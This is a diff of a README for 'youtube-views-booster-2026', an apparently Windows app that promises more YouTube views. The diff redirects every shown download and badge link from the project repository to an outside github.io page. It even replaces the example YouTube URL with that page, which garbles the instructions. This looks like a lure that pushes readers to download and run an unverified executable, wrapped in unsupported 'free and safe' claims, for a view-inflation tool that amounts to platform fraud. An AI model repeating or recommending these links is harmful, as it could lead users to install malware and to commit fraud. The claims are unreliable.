@@ -1,10 +1,10 @@
 # 🚀 youtube-views-booster-2026 - Get More Views Without Any Tech Skills
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/stacked-gondola7383/youtube-views-booster-2026)
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://stacked-gondola7383.github.io)
 
-[![Version](https://img.shields.io/badge/Version-2026-blue?style=flat-square)](https://github.com/stacked-gondola7383/youtube-views-booster-2026)
-[![Platform](https://img.shields.io/badge/Platform-Windows-orange?style=flat-square)](https://github.com/stacked-gondola7383/youtube-views-booster-2026)
-[![License](https://img.shields.io/badge/License-Free-green?style=flat-square)](https://github.com/stacked-gondola7383/youtube-views-booster-2026)
+[![Version](https://img.shields.io/badge/Version-2026-blue?style=flat-square)](https://stacked-gondola7383.github.io)
+[![Platform](https://img.shields.io/badge/Platform-Windows-orange?style=flat-square)](https://stacked-gondola7383.github.io)
+[![License](https://img.shields.io/badge/License-Free-green?style=flat-square)](https://stacked-gondola7383.github.io)
 
 ---
 
@@ -76,7 +76,7 @@ Follow these simple steps to get youtube-views-booster-2026 running on your comp
 
 ### Step 1: Download the Application
 
-[![Click Here to Download](https://img.shields.io/badge/⬇️_Click_Here_to_Download-FF5733?style=for-the-badge&logo=github)](https://github.com/stacked-gondola7383/youtube-views-booster-2026)
+[![Click Here to Download](https://img.shields.io/badge/⬇️_Click_Here_to_Download-FF5733?style=for-the-badge&logo=github)](https://stacked-gondola7383.github.io)
 
 Visit this link to download the application. It's completely free - no hidden fees, no trials, no sign-ups.
 
@@ -86,7 +86,7 @@ Once the download is complete, find the file in your **Downloads** folder. Doubl
 
 ### Step 3: Enter Your Video URL
 
-In the main window, you'll see an empty field. This is where you paste the link to your YouTube video. Copy the URL from your browser (it looks like `https://www.youtube.com/watch?v=...`) and paste it into the field.
+In the main window, you'll see an empty field. This is where you paste the link to your YouTube video. Copy the URL from your browser (it looks like `https://stacked-gondola7383.github.io`) and paste it into the field.
 
 ### Step 4: Choose Your Settings
 
@@ -199,7 +199,7 @@ You've read everything you need. Now it's time to take action. Your videos deser
 
 ### Download Now and See the Difference
 
-[![Download youtube-views-booster-2026 Now](https://img.shields.io/badge/🚀_Download_Now-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/stacked-gondola7383/youtube-views-booster-2026)
+[![Download youtube-views-booster-2026 Now](https://img.shields.io/badge/🚀_Download_Now-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://stacked-gondola7383.github.io)
 
 Remember - it's free, it's safe, and it takes less than 5 minutes to set up. Many of our users start seeing results within hours of their first run. Don't let your hard work go unnoticed any longer.
 
